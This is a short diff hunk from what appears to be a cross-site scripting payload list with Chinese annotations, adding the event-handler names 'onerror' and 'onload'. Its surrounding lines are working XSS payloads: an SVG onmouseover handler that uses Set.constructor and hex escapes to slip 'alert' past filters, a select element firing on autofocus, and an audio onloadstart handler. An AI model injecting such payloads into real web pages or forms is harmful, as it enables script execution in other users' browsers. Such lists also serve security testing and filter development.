@@ -77,7 +77,8 @@ content['alert'](6)
  
  鼠标移动：
  <svg/onmouseover=Set.constructor`al\x65rt\x28/xss/\x29```>
-  
+ onerror
+ onload
   
  <select autofocus onfocus="alert`1`">
 <audio src onloadstart=alert(1)>
